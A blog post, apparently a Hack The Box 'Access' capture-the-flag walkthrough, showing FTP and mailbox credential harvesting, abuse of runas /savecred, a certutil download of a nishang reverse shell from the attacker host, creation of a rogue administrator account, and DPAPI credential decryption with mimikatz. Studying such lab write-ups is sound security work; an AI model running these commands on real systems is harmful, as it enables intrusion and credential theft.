@@ -1,0 +1,550 @@
+---
+layout: default
+title: Access
+---
+
+<h1>Access</h1>
+<p class="date">02/03/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/access/access.png">
+
+<p>Access is an easy box, perfect to understand some Windows syntax and user limitations. To obtain the user flag we'll play with <code>ftp</code>, a <code>mdb</code> file and <code>telnet</code>. On the other hand, to escalate privileges we'll need to inspect a <code>lnk</code> file and abuse <code>runas</code> Windows command. And we also have an alternative way to escalate privileges using <code>mimikatz</code> to extract the Administrator's password.</p> 
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+    <a class="link-box" href="#alternative-privesc">Alternative Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First of all, run <code>nmap</code> to list versions and run default scripts. We can see we have <code>ftp</code> on port <code>21</code>, <code>telnet</code> on port <code>23</code> and a <code>IIS</code> on port <code>80</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/access# nmap -sC -sV 10.10.10.98
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-25 12:37 EST
+Nmap scan report for 10.10.10.98
+Host is up (0.046s latency).
+Not shown: 997 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+23/tcp open  telnet?
+80/tcp open  http    Microsoft IIS httpd 7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</pre>
+
+<p>If we check the <code>IIS</code> server we'll see the following picture.</p>
+
+<img class="img-fluid" src="/static/img/htb/access/1.png">
+
+<p>Nothing interesting here, so let's move forward.</p>
+
+<p>We can connect as an anonymous user to the <code>ftp</code> server with read permissions.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/access# ftp 10.10.10.98
+Connected to 10.10.10.98.
+220 Microsoft FTP Service
+Name (10.10.10.98:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-23-18  08:16PM       &lt;DIR>          Backups
+08-24-18  09:00PM       &lt;DIR>          Engineer
+226 Transfer complete.
+</pre>
+
+<p>We have two folders <code>Backups</code> and <code>Engineer</code> with <code>backup.mdb</code> and <code>Access Control.zip</code> files inside of them, respectively. Download both using binary mode, because we are working with files which contain binary data.</p>
+
+<pre class="prettyprint">
+ftp> cd Backups
+250 CWD command successful.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-23-18  08:16PM              5652480 backup.mdb
+ftp> bin
+200 Type set to I.
+ftp> get backup.mdb
+local: backup.mdb remote: backup.mdb
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+5652480 bytes received in 2.70 secs (1.9976 MB/s)
+ftp> cd ..
+250 CWD command successful.
+ftp> cd Engineer
+250 CWD command successful.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-24-18  12:16AM                10870 Access Control.zip
+226 Transfer complete.
+ftp> get "Access Control.zip"
+local: Access Control.zip remote: Access Control.zip
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+10870 bytes received in 0.19 secs (56.5916 kB/s)
+</pre>
+
+<p>The first file is a Microsoft <b>Access</b> Database.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/access# file backup.mdb 
+backup.mdb: Microsoft Access Database
+</pre>
+
+<p>We're using <code>mdb-tables</code> to list all the tables in the database.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/access# mdb-tables backup.mdb 
+acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
+</pre>
+
+<p>Using <code>mdb-export</code> we can see the rows in each table. After checking some of them we can find some credentials in <code>auth_user</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/access# mdb-export backup.mdb auth_user
+id,username,password,Status,last_login,RoleID,Remark
+25,"admin","admin",1,"08/23/18 21:11:47",26,
+27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
+28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
+</pre>
+
+<p>Going to the other file we downloaded from the ftp server, we have a password protected zip. Use one of the obtained passwords from the database (<code>access4u@security</code>) to extract its content.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/access# 7z e Access\ Control.zip -paccess4u@security
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-5700HQ CPU @ 2.70GHz (40671),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 10870 bytes (11 KiB)
+
+Extracting archive: Access Control.zip
+--
+Path = Access Control.zip
+Type = zip
+Physical Size = 10870
+
+Everything is Ok
+
+Size:       271360
+Compressed: 10870
+</pre>
+
+<p>Inside of the zip we have an Outlook folder. To retrieve the emails inside we can use <code>readpst</code> which will create a <code>Access Control.mbox</code> file.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/access# file Access\ Control.pst 
+Access Control.pst: Microsoft Outlook email folder (>=2003)
+root@kali:~/htb/access# readpst Access\ Control.pst 
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+	"Access Control" - 2 items done, 0 items skipped.
+</pre>
+
+<p>We can use <code>cat</code> directly to read the content of the <code>mbox</code> file. Here we have John's mail where he is sending the password for the <code>security</code> account in plain text.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/access# cat Access\ Control.mbox 
+From "john@megacorp.com" Thu Aug 23 19:44:07 2018
+Status: RO
+From: john@megacorp.com &lt;john@megacorp.com>
+Subject: MegaCorp Access Control System "security" account
+To: 'security@accesscontrolsystems.com'
+Date: Thu, 23 Aug 2018 23:44:07 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="--boundary-LibPST-iamunique-409073743_-_-"
+
+
+----boundary-LibPST-iamunique-409073743_-_-
+Content-Type: multipart/alternative;
+	boundary="alt---boundary-LibPST-iamunique-409073743_-_-"
+
+--alt---boundary-LibPST-iamunique-409073743_-_-
+Content-Type: text/plain; charset="utf-8"
+
+Hi there,
+
+The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
+
+Regards,
+John
+</pre>
+
+<p>Use the obtained credentials to connect to the machine via <code>telnet</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/access# telnet 10.10.10.98
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is '^]'.
+Welcome to Microsoft Telnet Service 
+
+login: security
+password: 4Cc3ssC0ntr0ller
+
+*===============================================================
+Microsoft Telnet Server.
+*===============================================================
+C:\Users\security>
+</pre>
+
+<p>We have the user flag in <code>security</code>'s desktop.</p>
+
+<pre class="prettyprint">
+C:\Users\security\Desktop>type user.txt
+<span flag="ff1f3b48913b213a31ff6756d2553d38">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>After some enumeration we can find a strange <code>.lnk</code> in Public's desktop.</p>
+
+<pre class="prettyprint">
+ Directory of C:\Users\Public\Desktop
+
+08/28/2018  06:51 AM    &lt;DIR>          .
+08/28/2018  06:51 AM    &lt;DIR>          ..
+07/14/2009  04:57 AM               174 desktop.ini
+08/22/2018  09:18 PM             1,870 ZKAccess3.5 Security System.lnk
+               2 File(s)          2,044 bytes
+</pre>
+
+<p>If we read the file, among all the crap, we can find that the shortcut is using <code>runas</code> to run <code>C:\ZKTeco\ZKAccess3.5\Access.exe</code> as <code>ACCESS\Administrator</code> without specifying a password.</p>
+
+<pre class="prettyprint">
+C:\Users>type C:\Users\Public\Desktop\"ZKAccess3.5 Security System.lnk"
+L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows��:��M�:*wWindowsV1MV�System32��:��MV�*�System32X2P�:�
+runas.exe��:1��:1�*Yrunas.exeL-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
+�wN���]N�D.��Q���`�Xaccess�_���8{E�3
+O�j)�H���
+)ΰ[�_���8{E�3
+O�j)�H���
+)ΰ[�	��1SPS�XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
+</pre>
+
+<p>This could mean we can use <code>runas</code> with the <code>/savecred</code> flag, which allows to run the command as Administrator.</p>
+
+<p>But we have a little problem here, <code>runas</code> is not echoing its output for some reason, so we won't see errors and that means we will have to be sure we are using the right syntax.</p>
+
+<pre class="prettyprint">
+C:\temp>runas /?
+
+</pre>
+
+<p>I decided I would create my own administrator account which would also be able to connect via <code>telnet</code> adding it to the correct localgroups.</p> 
+
+<pre class="prettyprint">
+C:\temp>runas /user:ACCESS\Administrator /savecred "net user /add manolo Caca123"
+C:\temp>runas /user:ACCESS\Administrator /savecred "net localgroup administrators manolo /add"
+C:\temp>runas /user:ACCESS\Administrator /savecred "net localgroup TelnetClients manolo /add"
+</pre>
+
+<p>But even using that administrator account I found I couldn't <b>ACCESS</b> to the Administrator folder.</p>
+
+<pre class="prettyprint">
+C:\Users>cd Administrator
+Access is denied.
+</pre>
+
+<p>So instead, I used an even easier method to retrieve the flag. Keep in mind that <code>runas</code> doesn't like windows internal commands, that's why we have to use <code>cmd /c</code> before <code>type</code> (I spent far more time to see this than I'd like to admit).</p>
+
+<pre class="prettyprint">
+C:\temp>runas /user:ACCESS\Administrator /savecred "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\temp\caca"
+</pre>
+
+<p>That's the easy way, but we will use PowerShell to get a full administrator shell instead.</p>
+
+<p>Modify <a href="https://github.com/samratashok/nishang">nishang</a>'s <code>Invoke-PowerShellTcp.ps1</code> to add the following line at the end of the file which will invoke the reverse shell.</p>
+
+<pre class="prettyprint">
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.35 -Port 6969
+</pre>
+
+<p>Serve the file using <code>SimpleHTTPServer</code> python module on our box and use <code>certutil</code> to download the PowerShell script.</p>
+
+<pre class="prettyprint">
+C:\temp>certutil -f -split -urlcache http://10.10.16.35/caca.ps1
+****  Online  ****
+  0000  ...
+  1132
+CertUtil: -URLCache command completed successfully.
+</pre>
+
+<p>Use <code>runas</code> to run our script as Administrator.</p>
+
+<pre class="prettyprint">
+C:\temp>runas /user:ACCESS\Administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\temp\caca.ps1"
+</pre>
+
+<p>If we listen on the port specified, we get a PS reverse shell as Administrator.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/access# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.98.
+Ncat: Connection from 10.10.10.98:49167.
+Windows PowerShell running as user Administrator on ACCESS
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+access\administrator
+</pre>
+
+<p>Now we can access to the administrator desktop and read <code>root.txt</code>.</p>
+
+<pre class="prettyprint">
+PS C:\Users\Administrator\Desktop> type root.txt
+<span flag="6e1586cc7ab230a8d297e8f933d904cf">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="alternative-privesc">Alternative Privilege Escalation</h2>
+
+<p>Thanks to <a href="https://twitter.com/kabutor_" target="_blank">@kabutor_</a> for this <i>alternative</i> way to escalate privileges.</p>
+
+<p>As we saw before, we can execute <code>runas</code> as Administrator, that means his credentials are stored somewhere in the machine, so we're going to retrieve them to simply extract the password and then login as him.</p>
+
+<p>To do that we first need the masterkey stored in <code>%appdata%\Microsoft\Protect\&lt;SID>\&lt;masterkey></code>.</p>
+
+<pre class="prettyprint">
+C:\>cd %appdata%\Microsoft\Protect
+
+C:\Users\security\AppData\Roaming\Microsoft\Protect>dir /a
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect
+
+08/22/2018  09:18 PM    &lt;DIR>          .
+08/22/2018  09:18 PM    &lt;DIR>          ..
+08/22/2018  09:18 PM                24 CREDHIST
+08/22/2018  09:18 PM    &lt;DIR>          S-1-5-21-953262931-566350628-63446256-1001
+               1 File(s)             24 bytes
+               3 Dir(s)  16,672,870,400 bytes free
+</pre>
+
+<p>Here we only have one <code>SID</code> with one masterkey in it, so it should be the one we are looking for.</p>
+
+<pre class="prettyprint">
+C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>dir /a
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001
+
+08/22/2018  09:18 PM    &lt;DIR>          .
+08/22/2018  09:18 PM    &lt;DIR>          ..
+08/22/2018  09:18 PM               468 0792c32e-48a5-4fe3-8b43-d93d64590580
+08/22/2018  09:18 PM                24 Preferred
+               2 File(s)            492 bytes
+               2 Dir(s)  16,767,504,384 bytes free
+</pre>
+
+<p>Use <code>certutil</code> to encode it to <code>base64</code> to be able to copy paste it outside the machine.</p>
+
+<pre class="prettyprint">
+C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 C:\temp\caca
+
+C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>type C:\temp\caca
+-----BEGIN CERTIFICATE-----
+AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMA
+LQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAA
+sAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU+/9g
+uV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6
+DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7
+Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEqOtnHqMOc
+wFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAA
+D+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1
+/a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1
+Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ
+-----END CERTIFICATE-----
+</pre>
+
+<p>We will also need the credentials stored in <code>%appdata%\Microsoft\Credentials\&lt;credentials></code>.</p>
+
+<pre class="prettyprint">
+C:\>cd %appdata%\Microsoft\Credentials
+
+C:\Users\security\AppData\Roaming\Microsoft\Credentials>dir /a
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials
+
+08/22/2018  09:18 PM    &lt;DIR>          .
+08/22/2018  09:18 PM    &lt;DIR>          ..
+08/22/2018  09:18 PM               538 51AB168BE4BDB3A603DADE4F8CA81290
+               1 File(s)            538 bytes
+               2 Dir(s)  16,760,569,856 bytes free
+</pre>
+
+<p>Use the same method to encode it to <code>base64</code>.</p>
+
+<pre class="prettyprint">
+C:\Users\security\AppData\Roaming\Microsoft\Credentials>certutil -encode 51AB168BE4BDB3A603DADE4F8CA81290 C:\temp\pipi
+
+C:\Users\security\AppData\Roaming\Microsoft\Credentials>type C:\temp\pipi
+-----BEGIN CERTIFICATE-----
+AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9
+ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQA
+aQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/
+MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m
+5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nu
+WlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+
+WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZh
+xcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2h
+X5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuhfXEojcbDfuJs
+ZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zW
+C+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJ
+vEgzQvv2cbicmQ==
+-----END CERTIFICATE-----
+</pre>
+
+<p>Now copy paste both files to a Windows machine with <code>mimikatz</code> and decode them with <code>certutil</code> again to get the original ones.</p>
+
+<pre class="prettyprint">
+C:\Users\User\Documents>certutil -decode caca 0792c32e-48a5-4fe3-8b43-d93d64590580
+C:\Users\User\Documents>certutil -decode pipi 51AB168BE4BDB3A603DADE4F8CA81290
+</pre>
+
+<p>Next, using <code>mimikatz</code> we're going to decrypt the masterkey indicating the user's <code>SID</code> and password.</p>
+
+<pre class="prettyprint">
+mimikatz # dpapi::masterkey /in:C:\Users\User\Documents\0792c32e-48a5-4fe3-8b43-d93d64590580 /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
+**MASTERKEYS**
+  dwVersion          : 00000002 - 2
+  szGuid             : {0792c32e-48a5-4fe3-8b43-d93d64590580}
+  dwFlags            : 00000005 - 5
+  dwMasterKeyLen     : 000000b0 - 176
+  dwBackupKeyLen     : 00000090 - 144
+  dwCredHistLen      : 00000014 - 20
+  dwDomainKeyLen     : 00000000 - 0
+[masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : 9c51ca4d00708c73d4fbff60b95e549e
+    rounds           : 000043f8 - 17400
+    algHash          : 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         : 00006610 - 26128 (CALG_AES_256)
+    pbKey            : e78fb1d989c4ccd7a05285c17fae1c31ad1210f7ada051ae3203536df613e63a0e4647ca9ed51407637d8c1cc2ad16b2306aab56d7d2707b0c77422e7de39eb8bdfcca55044b4a7f853b6f0b3333213b5b0d80c7c1021f6c4ac2f5fa3772adbe50af7fdf07b0e0ea940d70a1245db7df847f615530a93895012a3ad9c7a8c39cc0592d06d714c9ee8fe34ced5062c412
+
+[backupkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : 4bb6dd9b5b9656d97b78f114796457f4
+    rounds           : 000043f8 - 17400
+    algHash          : 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         : 00006610 - 26128 (CALG_AES_256)
+    pbKey            : 0fe6b3aa5dd3af46bd7a87cbc0161fc41ae13f8714a22bcb5bda86f24d95ad03369a5335159185d0276743d0c1132b35fdaffad247d3c4f5f43260413c28b401ed70e42e0184f9e8c4668abc36eb7327bd2c7374a2381b4cdd4ea7c465deaa755e0f53672473900db8868b428327edaa
+
+[credhist]
+  **CREDHIST INFO**
+    dwVersion        : 00000003 - 3
+    guid             : {009668e5-9305-401b-ba0d-dfa0e11b34d0}
+
+
+
+[masterkey] with password: 4Cc3ssC0ntr0ller (normal user)
+  key : b360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
+  sha1: bf6d0654ef999c3ad5b09692944da3c0d0b68afe
+</pre>
+
+<p>If everything works as expected, <code>mimikatz</code> should place the decrypted masterkey in cache.</p>
+
+<pre class="prettyprint">
+mimikatz # dpapi::cache
+
+CREDENTIALS cache
+=================
+SID:S-1-5-21-953262931-566350628-63446256-1001;GUID:{009668e5-9305-401b-ba0d-dfa0e11b34d0};MD4:b41db16a61cb04b231625de260163015;SHA1:75f1e3aa023a0f57d4225f3ab4f18f6fea025414;
+
+MASTERKEYS cache
+================
+GUID:{0792c32e-48a5-4fe3-8b43-d93d64590580};KeyHash:bf6d0654ef999c3ad5b09692944da3c0d0b68afe
+
+DOMAINKEYS cache
+================
+</pre>
+
+<p>Now we can read the credentials file and extract the Administrator's password.</p>
+
+<pre class="prettyprint">
+mimikatz # dpapi::cred /in:C:\Users\User\Documents\51AB168BE4BDB3A603DADE4F8CA81290
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {0792c32e-48a5-4fe3-8b43-d93d64590580}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000020 - 32
+  pbSalt             : f5bbbac240bd90d9af7d3c2cfb7f301f1f123ac94d07a3cc012038135fa5a6bc
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         :
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwAlgHashLen       : 00000200 - 512
+  dwHmac2KeyLen      : 00000020 - 32
+  pbHmack2Key        : f9642d323fae366a4f7293d02f26e4472adc32b00bac6a061914458dadfd3e52
+  dwDataLen          : 00000100 - 256
+  pbData             : e73542ff71d08529f9da5ff88edcd5be44d11c9c02c45fdfd9ee5a531628cb0f9e8dc221eb5b4d83a857aff13473131c927527217fe177e08d63a63eb5ce5341576b33332806e062363e58786fb7551aaa2e0676b8e3957f43cf1f11a2ed149c431104e5f93f20364916df25a0168ede23788bd9d71192cdb661c5c5686ed256c8691057fe6fe2a2b1765ba0979ee9140c010210eea81ac00830f74c35a196ac1f46bd69d7a86ca82da15f9bbcf1c40cbbe41d58d4a8924afde97e2a99a6e9f33a297ef2508401c229a451b911e9469ba17d71288dc6c37ee26c65ecc8accd4b5b3c0c2ccfcae6b0a76384a0e27c4edb7a0ecece2afd9889252304db5767bbc3
+  dwSignLen          : 00000040 - 64
+  pbSign             : 63fcc153bcd60befd074a5098ea0e552f8809562c553985baa8720a828e61e05bd5d1cb8200711551a100ed3b853598b3875ba90b689bc483342fbf671b89c99
+
+Decrypting Credential:
+ * volatile cache: GUID:{0792c32e-48a5-4fe3-8b43-d93d64590580};KeyHash:bf6d0654ef999c3ad5b09692944da3c0d0b68afe
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000f4 - 244
+  credUnk0       : 00002004 - 8196
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 8/22/2018 9:18:49 PM
+  unkFlagsOrSize : 00000038 - 56
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:interactive=ACCESS\Administrator
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : ACCESS\Administrator
+  CredentialBlob : 55Acc3ssS3cur1ty@megacorp
+  Attributes     : 0
+</pre>
+
+<p>With the retrieved password we can connect via <code>telnet</code> as Administrator.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/access# telnet 10.10.10.98
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is '^]'.
+Welcome to Microsoft Telnet Service 
+
+login: administrator
+password: 55Acc3ssS3cur1ty@megacorp
+
+*===============================================================
+Microsoft Telnet Server.
+*===============================================================
+C:\Users\Administrator>
+</pre>
